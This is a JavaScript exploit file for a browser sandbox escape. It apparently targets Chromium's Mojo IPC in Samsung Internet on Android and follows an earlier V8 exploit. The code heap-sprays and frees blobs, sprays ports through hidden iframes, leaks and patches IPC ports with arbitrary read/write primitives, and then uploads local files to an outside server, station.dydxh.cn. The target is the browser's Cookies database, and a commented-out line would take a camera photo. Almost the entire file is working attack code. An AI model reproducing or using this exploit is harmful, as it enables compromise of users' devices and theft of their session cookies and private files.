const kSprayNums = 0x100;
const kPortSize = 0x80;
const DEBUG = 0
let port_addr;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function w32(ab, offset, value) {
    let u32 = new Uint32Array(ab);
    u32[offset/8] = value;
}

async function send_file(filename='', path="leak", filesize=50) {
    let urlLoaderClient = new network.mojom.URLLoaderClientPtr;
    new mojo.Binding(
        network.mojom.URLLoaderClient, {},
        mojo.makeRequest(urlLoaderClient)
    );

    // Reuse the `url_loader_factory_ptr`
    await url_loader_factory_ptr.createLoaderAndStart(
      mojo.makeRequest(new network.mojom.URLLoaderPtr), 0, 0, 0,
      Object.assign(new network.mojom.URLRequest, {
        method: 'POST',
        url: Object.assign(new url.mojom.Url, {url: "http://station.dydxh.cn:7777/" + path}),
        siteForCookies: Object.assign(new network.mojom.SiteForCookies, {
          scheme: "http",
          registrableDomain: "",
          schemefullySame: true
        }),
        referrer: Object.assign(new url.mojom.Url, {url: ''}),
        headers: Object.assign(new network.mojom.HttpRequestHeaders, {headers: []}),
        corsExemptHeaders: Object.assign(new network.mojom.HttpRequestHeaders, {headers: []}),
        requestBody: Object.assign(new network.mojom.URLRequestBody, {
          elements: [
            Object.assign(new network.mojom.DataElement, {
              type: network.mojom.DataElementType.kFile,
              buf: [],
              path: Object.assign(new mojoBase.mojom.FilePath, {
                path: filename
              }),
              blobUuid: "",
              offset: 0,
              length: filesize,
              expectedModificationTime: Object.assign(new mojoBase.mojom.Time, {
                internalValue: 0
              })
            }),
          ],
          identifier: 1337,
          containsSensitiveInfo: false
        }),
        mode: network.mojom.RequestMode.kNoCors,
        requestInitiator: Object.assign(new url.mojom.Origin, {
          scheme: "http",
          host: location.hostname,
          port: 80
        }),
        credentialsMode: network.mojom.CredentialsMode.kInclude,
        customProxyPreCacheHeaders: Object.assign(new network.mojom.HttpRequestHeaders, {headers: []}),
        customProxyPostCacheHeaders: Object.assign(new network.mojom.HttpRequestHeaders, {headers: []}),
        requestedWithHeader: '',
        clientDataHeader: '',
        fetchIntegrity: '',
        transitionType: 0
      }),
      urlLoaderClient,
      {}
    );
    await sleep(2000);
}

function prepare_for_leak(chunk_size, leak_size) {
    url_loader_factory_ptr = new network.mojom.URLLoaderFactoryPtr();

    // ATTENTION PLEASE!!!
    // alert("get port address...");
    patch_chrome();
    url_loader_factory_req = mojo.makeRequest(url_loader_factory_ptr);
    // ATTENTION FINISH!!!

    Mojo.bindInterface(network.mojom.URLLoaderFactory.name,
        url_loader_factory_req.handle, "process");

    url_loader_ptr = new network.mojom.URLLoaderPtr();
    url_loader_req = mojo.makeRequest(url_loader_ptr);

    url_request = new network.mojom.URLRequest();
    url_request.method = "POST";
    url_request.url = new url.mojom.Url();
    url_request.url.url = "https://station.dydxh.cn/port";

    url_request.siteForCookies = new network.mojom.SiteForCookies();
    url_request.siteForCookies.scheme = "https";
    url_request.siteForCookies.registrableDomain = "";
    url_request.siteForCookies.schemefullySame = true;

    url_request.requestInitiator = new url.mojom.Origin();
    url_request.requestInitiator.scheme = "";
    url_request.requestInitiator.host = "";
    url_request.requestInitiator.port = 0;
    url_request.requestInitiator.nonceIfOpaque = new mojoBase.mojom.UnguessableToken();
    url_request.requestInitiator.nonceIfOpaque.high = 1;
    url_request.requestInitiator.nonceIfOpaque.low = 1;

    url_request.isolatedWorldOrigin = null;

    url_request.referrer = new url.mojom.Url();
    url_request.referrer.url = window.location.href;

    url_request.headers = new network.mojom.HttpRequestHeaders();
    url_request.headers.headers = [];

    url_request.corsExemptHeaders = new network.mojom.HttpRequestHeaders();
    url_request.corsExemptHeaders.headers = [];

    url_request.mode = 2;
    url_request.fetchIntegrity = "";

    url_request.requestBody = new network.mojom.URLRequestBody();

    data_element = new network.mojom.DataElement();
    data_element.type = 5;
    // data_element.buf = new mojoBase.mojom.BigBuffer();
    data_element.buf = new Array;
    while (data_element.buf.length < chunk_size) {
        data_element.buf.push(0x23);
    }
    data_element.path = new mojoBase.mojom.FilePath();
    data_element.path.path = "";
    data_element.length = leak_size;
    data_element.expectedModificationTime = new mojoBase.mojom.Time();

    url_request.requestBody.elements = [data_element];

    url_request.identifier = 99;
    url_request.renderFrameId = 0;
    url_request.isMainFrame = true;

    function URLLoaderClientImpl() {
        this.binding = new mojo.Binding(network.mojom.URLLoaderClient, this);
    }

    url_loader_client = new URLLoaderClientImpl();
    url_loader_client_ptr = new network.mojom.URLLoaderClientPtr();
    url_loader_client.binding.bind(mojo.makeRequest(url_loader_client_ptr));

    traffic_tag = new network.mojom.MutableNetworkTrafficAnnotationTag();
}

async function do_leak() {
    await url_loader_factory_ptr.createLoaderAndStart(url_loader_req, 0, 0, 0,
                                                      url_request, url_loader_client_ptr,
                                                      traffic_tag);
}

function get_port() {
    let xhttp = new XMLHttpRequest();
    xhttp.open("GET", "/port", false);
    xhttp.send();
    let res = eval(xhttp.responseText); // Get a json here
    return res;
}

function createBitmap(alphaType, width, height, raw_data) {
    let colorSpace = new Array(9);
    let imageInfo = new skia.mojom.ImageInfo();
    imageInfo.colorType = 4;
    imageInfo.alphaType = alphaType;
    imageInfo.serializedColorSpace = colorSpace;
    imageInfo.width = width;
    imageInfo.height = height;
    let bigBuffer = new mojoBase.mojom.BigBuffer();
    bigBuffer.bytes = new Uint8Array(raw_data);
    let bitmap = new skia.mojom.Bitmap();
    bitmap.imageInfo = imageInfo;
    bitmap.rowBytes = width * 4;
    bitmap.pixelData = bigBuffer;
    return bitmap;
}

function spray_port(n) {
    for (let i = 0; i < n; i++) {
        var iframe = document.createElement('iframe');
        iframe.src = 'https://station.dydxh.cn/hang/' + i;
        iframe.style.display = "none";
        document.body.appendChild(iframe);
    }
}

function release_hang() {
    let xhttp = new XMLHttpRequest();
    xhttp.open("GET", "/release", false)
    xhttp.send()
    return xhttp.responseText
}

async function leak_port() {
    // 1. spray blob
    print("[INFO]    1.0. spray blobs");
    let allocator = getAllocationConstructor();
    let blob_chunk = new ArrayBuffer(kPortSize);
    w32(blob_chunk, 0, 0x41414141);
    let spray_blobs = await heapSreay(allocator, blob_chunk, kSprayNums);
    await sleep(1000);
    if (DEBUG) alert("spray blob finish");

    const tmp_point = kSprayNums / 4;
    // 2. free blobs
    print("[INFO]    1.1. free blobs");
    for (let i = tmp_point; i < kSprayNums; i += 1) {
        await spray_blobs[i].free();
    }
    await sleep(2000);
    if (DEBUG) alert("free 1 finish");

    // 3. spray Ports
    print("[INFO]    1.2. spray ports");
    let fucking_concurrent_requests = 6;
    spray_port(fucking_concurrent_requests);
    await sleep(1000);
    if (DEBUG) alert("spray port finish");

    // 4. free rest of blob
    print("[INFO]    1.3. free rest of blobs");
    for (let i = 0; i < tmp_point; i += 1) {
        spray_blobs[i].free();
    }
    await sleep(2000);
    if (DEBUG) alert("free 2 finish");

    let leaked_ports = [];
    do {
        // 5. leak
        print("[INFO]    1.4. do leak");
        await do_leak();
        await sleep(1000);

        // 6. get port
        print("[INFO]    1.5. get port_name from server");
        if (DEBUG) alert("waiting to get port...");
        leaked_ports = get_port();
        await sleep(500);
    } while (0) // !leaked_ports.length)

    if (!leaked_ports.length) {
        await heapSreay(allocator, blob_chunk, kSprayNums);
        let resp = release_hang();
        alert("Leak Failed, release: " + resp);
        location.reload()
        // throw "Leak Error";
    }

    return leaked_ports;
}

function register_service_worker() {
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('service-worker.js');
    } else {
        alert("Register ServiceWorker Failed");
    }
}

/* Not Used
let port_addr;
function get_port_addr() {
    port_addr = arb_read(0x18000);
}
function get_peer_node_name() {}
*/
function patch_port(leaked_ports_name) {
    // Patch and reuse the previous `url_loader_factory_ptr`.

    if (DEBUG) alert("1. " + (port_addr).hex());
    for (let i = 0; i < 4; i++) {
        arb_ta[i] = leaked_ports_name[i];
    }
    arb_ta[4] = 2;
    print("[INFO]    - local_port addr: " + port_addr.hex());
    if (DEBUG) alert("2. " + (port_addr).hex());
}

async function prepare() {
    // 0.0 prepare ServiceWorker
    print("[INFO]    0.0. prepare ServiceWorker");
    register_service_worker();

    // 0.1 prepare for leak
    print("[INFO]    0.1. prepare for leak");
    prepare_for_leak(kPortSize, 2 * kSprayNums * kPortSize);
    await sleep(1000);
    port_addr = arb_read(0x18000);
    // alert(port_addr.hex());
    arb_mem(port_addr + 0x18);
    if (DEBUG) alert("prepare finish");

}

async function sandbox_exploit() {
    print("[INFO] finish v8 exploit");
    print("[INFO] start sandbox exploit");

    // 0. prepare
    print("[INFO] 0. prepare");
    await prepare()

    // 1. leak
    print("[INFO] 1. leak port");
    let leaked_ports_name = []
    leaked_ports_name = await leak_port();

    for(let port_name of leaked_ports_name) {
        // 2. patch port
        print("[INFO] 2. patch local port");
        patch_port(port_name);
        // 3. send photoshare
        print("[INFO] 3. send local file");
        // await send_file("/sdcard/DCIM/Camera/20210331_221334.jpg", "photo", 1024*1024*6);
        await send_file("/data/data/com.sec.android.app.sbrowser/app_sbrowser/Default/Cookies", "leak", 1024*1024*6);
    }

    release_hang()
    print("[INFO] 4. finish");
}
